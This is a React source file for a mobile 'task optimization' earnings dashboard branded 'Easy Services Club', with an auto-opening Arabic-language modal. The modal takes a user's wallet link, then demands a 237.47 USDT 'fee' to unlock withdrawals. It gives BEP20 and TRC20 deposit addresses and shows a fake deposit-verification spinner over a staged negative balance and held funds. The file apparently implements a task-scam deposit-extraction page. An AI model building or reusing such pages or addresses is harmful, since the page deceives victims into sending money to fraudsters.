import React, { useState, useEffect } from 'react';
import { 
  Home, 
  FileText, 
  Monitor, 
  Wallet, 
  Zap, 
  ArrowUp, 
  Box, 
  ClipboardList,
  Copy,
  CheckCircle2,
  Loader2
} from 'lucide-react';

// --- Constants & Styles ---
const COLORS = {
  primaryPink: '#ff5a87',
  teal: '#40b1a8',
  blue: '#3498db',
  borderOrange: '#f19c5c',
  bgGray: '#f6f6f6',
  greetingGray: '#e6e6e6',
  navDark: '#1a1c1e',
};

// --- Components ---

const Logo: React.FC = () => (
  <div className="flex flex-col leading-none">
    <div className="flex items-center">
      <div className="relative font-black text-3xl italic tracking-tighter text-[#f19c5c] flex items-center">
        E
        <div className="absolute -left-1 top-2">
           <ArrowUp className="w-5 h-5 stroke-[4] text-[#f19c5c] -rotate-45 translate-x-1 -translate-y-1" />
        </div>
        <span className="text-white ml-0.5">asy</span>
      </div>
    </div>
    <div className="text-[7px] font-bold text-white tracking-[0.2em] mt-[-2px]">
      SERVICES CLUB
    </div>
    <div className="text-[5px] text-gray-400 mt-[-1px]">
      Web Design & Digital Marketing Agency
    </div>
  </div>
);

const Header: React.FC = () => {
  return (
    <header className="bg-black text-white px-4 py-3 flex justify-between items-center sticky top-0 z-[100]">
      <Logo />
      <div className="flex items-center gap-3">
        <button className="bg-[#ff5a87] text-white text-[11px] font-bold px-4 py-1.5 rounded-full active:scale-95 transition-transform">
          CONTACT
        </button>
        <div className="w-10 h-10 rounded-full bg-[#cbd5e1] border-2 border-[#64748b] flex items-center justify-center overflow-hidden">
           <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=headerUser" alt="user" className="w-full h-full opacity-50" />
        </div>
      </div>
    </header>
  );
};

const GreetingBar: React.FC = () => {
  return (
    <div className="bg-[#e6e6e6] px-4 py-3 flex justify-between items-center shadow-sm">
      <div className="flex items-center gap-2">
        <div className="w-11 h-11 rounded-full border-2 border-white overflow-hidden shadow-sm bg-[#3b5998]">
          <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=muhamad" alt="muhamad" className="w-full h-full" />
        </div>
        <span className="font-bold text-[#1a1c1e] text-lg tracking-tight">Hi, muhamad10</span>
      </div>
      <div className="font-extrabold text-[#1a1c1e] text-lg">VIP1</div>
    </div>
  );
};

const MainCard: React.FC = () => {
  return (
    <div className="p-4">
      <div className="bg-white rounded-[20px] border-[2px] border-[#f19c5c] shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden flex flex-col items-center py-6 px-4">
        {/* Commission Area */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative flex items-center justify-center mb-2">
            <div className="w-14 h-14 rounded-full border-[2.5px] border-[#40b1a8] flex items-center justify-center">
              <Zap className="text-[#40b1a8] w-7 h-7 fill-[#40b1a8]/10" />
              <div className="absolute -top-1 -right-1 bg-white p-0.5">
                <ArrowUp className="w-5 h-5 text-[#40b1a8] stroke-[3]" />
              </div>
            </div>
          </div>
          <h3 className="text-[#40b1a8] font-bold text-base">Commission</h3>
          <div className="text-3xl font-black text-[#1a1c1e] mt-1">0 USD</div>
          <p className="text-gray-900 font-medium text-sm mt-1">Daily commission earned</p>
        </div>

        {/* Separator */}
        <div className="w-full border-t border-dashed border-gray-300 mb-6"></div>

        {/* Stats Row */}
        <div className="w-full grid grid-cols-2">
          <div className="flex flex-col items-center px-2 text-center">
            <div className="w-14 h-14 bg-white rounded-xl border-2 border-gray-100 flex items-center justify-center mb-3">
               <Wallet className="text-[#ff5a87] w-8 h-8" />
            </div>
            <h4 className="font-extrabold text-gray-900 text-[15px] mb-1 leading-tight">Wallet Balance</h4>
            <div className="font-black text-xl text-[#1a1c1e] mb-1">-883.95 USD</div>
            <p className="text-[11px] text-gray-900 font-medium leading-[1.3]">Commission will be<br/>added here</p>
          </div>
          
          <div className="flex flex-col items-center px-2 text-center">
             <div className="w-14 h-14 bg-[#3498db]/10 rounded-xl flex items-center justify-center mb-3">
               <div className="bg-[#3498db] rounded-lg p-1.5">
                 <Box className="text-white w-6 h-6" />
               </div>
            </div>
            <h4 className="font-extrabold text-gray-900 text-[15px] mb-1 leading-tight">Hold Amount</h4>
            <div className="font-black text-xl text-[#1a1c1e] mb-1">2180 USD</div>
            <p className="text-[11px] text-gray-900 font-medium leading-[1.3]">Contact Support for<br/>inquiries</p>
          </div>
        </div>
      </div>
    </div>
  );
};

const OptimizationSection: React.FC = () => {
  const products = [
    "https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=300&q=80",
    "https://images.unsplash.com/photo-1505693419148-4034b9fd3fa2?w=300&q=80",
    "https://images.unsplash.com/photo-1595428774223-ef52624120d2?w=300&q=80"
  ];

  return (
    <div className="px-5 pb-28">
      <div className="flex justify-between items-center mb-5">
        <h2 className="text-xl font-extrabold text-[#1a1c1e]">Start Optimization</h2>
        <div className="text-xl font-black">
          <span className="text-[#ff5a87]">17</span>
          <span className="text-gray-900">/26</span>
        </div>
      </div>
      
      <div className="bg-[#f0f0f0] rounded-[24px] p-6 flex gap-4 overflow-x-auto no-scrollbar shadow-inner">
        {products.map((url, idx) => (
          <div key={idx} className="min-w-[150px] aspect-square bg-white rounded-2xl p-3 shadow-sm border border-gray-100 flex-shrink-0 active:scale-95 transition-transform cursor-pointer overflow-hidden">
            <img 
              src={url} 
              alt={`item-${idx}`} 
              className="w-full h-full object-cover rounded-lg"
            />
          </div>
        ))}
      </div>
    </div>
  );
};

const BottomNav: React.FC = () => {
  return (
    <div className="fixed bottom-0 left-0 right-0 bg-[#1a1c1e] h-[72px] flex items-center justify-around z-[200] px-4 pb-2">
      <div className="flex flex-col items-center text-white cursor-pointer group active:opacity-70 transition-opacity">
        <Home className="w-[26px] h-[26px] mb-1 stroke-[2.5]" />
        <span className="text-[11px] font-bold">Home</span>
      </div>

      <div className="relative -top-8 flex flex-col items-center">
        <div className="w-[72px] h-[72px] bg-white rounded-full border-[5px] border-[#ff5a87] shadow-[0_10px_25px_rgba(255,90,135,0.4)] flex items-center justify-center p-3 active:scale-90 transition-transform">
           <div className="w-full h-full border-[1.5px] border-gray-200 rounded-full flex items-center justify-center">
             <Monitor className="text-[#1a1c1e] w-8 h-8 stroke-[2.5]" />
           </div>
        </div>
        <span className="text-[11px] font-black text-white mt-1.5 uppercase tracking-wide">Starting</span>
      </div>

      <div className="flex flex-col items-center text-white cursor-pointer active:opacity-70 transition-opacity">
        <ClipboardList className="w-[26px] h-[26px] mb-1 stroke-[2.5]" />
        <span className="text-[11px] font-bold">Records</span>
      </div>
    </div>
  );
};

// --- Modal Component ---

const StepModal: React.FC<{ step: number; setStep: (s: number) => void }> = ({ step, setStep }) => {
  const [walletAddress, setWalletAddress] = useState('');
  const [copyStatus, setCopyStatus] = useState<string | null>(null);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopyStatus(id);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  if (step === 0) return null;

  const renderContent = () => {
    switch (step) {
      case 1:
        return (
          <div className="p-8 text-right" dir="rtl">
            <h2 className="text-xl font-bold mb-4 text-[#1a1c1e]">أهلاً بك muhamad10</h2>
            <p className="text-gray-600 mb-8 leading-relaxed">
              تم حل أمر المهام ضمن اتفاق بروتوكول بين منصتنا ومنصة mini pro. اضغط التالي للمتابعة.
            </p>
            <button 
              onClick={() => setStep(2)}
              className="w-full bg-[#ff5a87] text-white py-4 rounded-2xl font-bold text-lg shadow-lg active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="p-8 text-right" dir="rtl">
            <h2 className="text-xl font-bold mb-4 text-[#1a1c1e]">إعداد المحفظة</h2>
            <p className="text-gray-600 mb-6">يرجى إدخال رابط المحفظة الخاص بك لسحب الأرباح.</p>
            <input 
              type="text"
              placeholder="رابط المحفظة..."
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              className="w-full p-4 border-2 border-gray-100 rounded-2xl mb-6 focus:border-[#ff5a87] outline-none transition-colors"
            />
            <button 
              onClick={() => setStep(3)}
              disabled={!walletAddress}
              className="w-full bg-[#ff5a87] text-white py-4 rounded-2xl font-bold text-lg shadow-lg active:scale-95 disabled:opacity-50 transition-all"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="p-6 text-right max-h-[85vh] overflow-y-auto no-scrollbar" dir="rtl">
            <h2 className="text-xl font-bold mb-4 text-[#1a1c1e]">أهلاً بك muhamad10</h2>
            <p className="text-gray-600 text-sm mb-6 leading-relaxed">
              بقي أمر إيداع مبلغ <span className="text-[#ff5a87] font-black">237.47</span> عملة usdt bep 20 أو Tron TRC 20 لفتح قناة السحب. هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
            </p>
            
            <div className="space-y-4 mb-8">
              <div className="bg-gray-50 p-4 rounded-xl border border-gray-200 relative">
                <p className="text-[10px] font-bold text-gray-400 mb-1">USDT BEP 20</p>
                <p className="text-[11px] font-mono break-all pr-8">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
                <button 
                  onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d', 'bep')}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
                >
                  {copyStatus === 'bep' ? <CheckCircle2 className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
                </button>
              </div>

              <div className="bg-gray-50 p-4 rounded-xl border border-gray-200 relative">
                <p className="text-[10px] font-bold text-gray-400 mb-1">Tron TRC 20</p>
                <p className="text-[11px] font-mono break-all pr-8">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</p>
                <button 
                  onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai', 'trc')}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
                >
                  {copyStatus === 'trc' ? <CheckCircle2 className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <button 
              onClick={() => setStep(4)}
              className="w-full bg-[#ff5a87] text-white py-4 rounded-2xl font-bold text-lg shadow-lg active:scale-95 transition-all"
            >
              تم الايداع
            </button>
          </div>
        );
      case 4:
        return (
          <div className="p-10 text-center" dir="rtl">
            <div className="flex justify-center mb-6">
              <Loader2 className="w-16 h-16 text-[#ff5a87] animate-spin" />
            </div>
            <h2 className="text-xl font-bold text-[#1a1c1e] mb-2">الرجاء الانتظار</h2>
            <p className="text-gray-500">جاري التأكد من عملية الإيداع... يرجى عدم إغلاق الصفحة.</p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center p-6 bg-black/30 backdrop-blur-[1.5px] animate-in fade-in duration-300">
      {/* 
          Using backdrop-blur-[1.5px] for a subtle blurring effect behind the overlay.
          The dialog box remains perfectly crisp.
      */}
      <div className="w-full max-w-sm bg-white rounded-[40px] shadow-[0_20px_60px_-15px_rgba(0,0,0,0.3)] overflow-hidden animate-in zoom-in-95 duration-300 ring-1 ring-black/5">
        {renderContent()}
      </div>
    </div>
  );
};

// --- App Root ---

export default function App() {
  const [modalStep, setModalStep] = useState(0);

  useEffect(() => {
    const timer = setTimeout(() => setModalStep(1), 800);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen bg-[#f6f6f6] flex flex-col relative">
      {/* 
          Background Content Wrapper:
          We apply a subtle 1.5px blur and light scaling to the background.
          The overlay modal sits outside this div to ensure the dialog stays sharp.
      */}
      <div className={`flex flex-col min-h-screen transition-all duration-700 ease-in-out ${modalStep > 0 ? 'blur-[1.5px] scale-[0.985] brightness-95 pointer-events-none' : ''}`}>
        <Header />
        <GreetingBar />
        <main className="flex-grow">
          <MainCard />
          <OptimizationSection />
        </main>
        <BottomNav />
        
        {/* Android-style navigation bar placeholder */}
        <div className="fixed bottom-0 left-0 right-0 h-6 bg-[#f0f0f0]/90 backdrop-blur-sm z-[210] flex justify-around items-center px-12 border-t border-gray-200">
          <div className="w-4 h-4 border-2 border-gray-400 rounded-sm opacity-20"></div>
          <div className="w-4 h-4 border-2 border-gray-400 rounded-full opacity-20"></div>
          <div className="w-0 h-0 border-t-[6px] border-t-transparent border-r-[8px] border-r-gray-400 border-b-[6px] border-b-transparent opacity-20"></div>
        </div>
      </div>

      {/* 
          Overlay Modal: 
          Outside the blurred container to maintain high visibility and sharpness.
      */}
      <StepModal step={modalStep} setStep={setModalStep} />

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in {
          animation: fadeIn 0.5s ease-out forwards;
        }
        * {
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
        .no-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .no-scrollbar {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
    </div>
  );
}
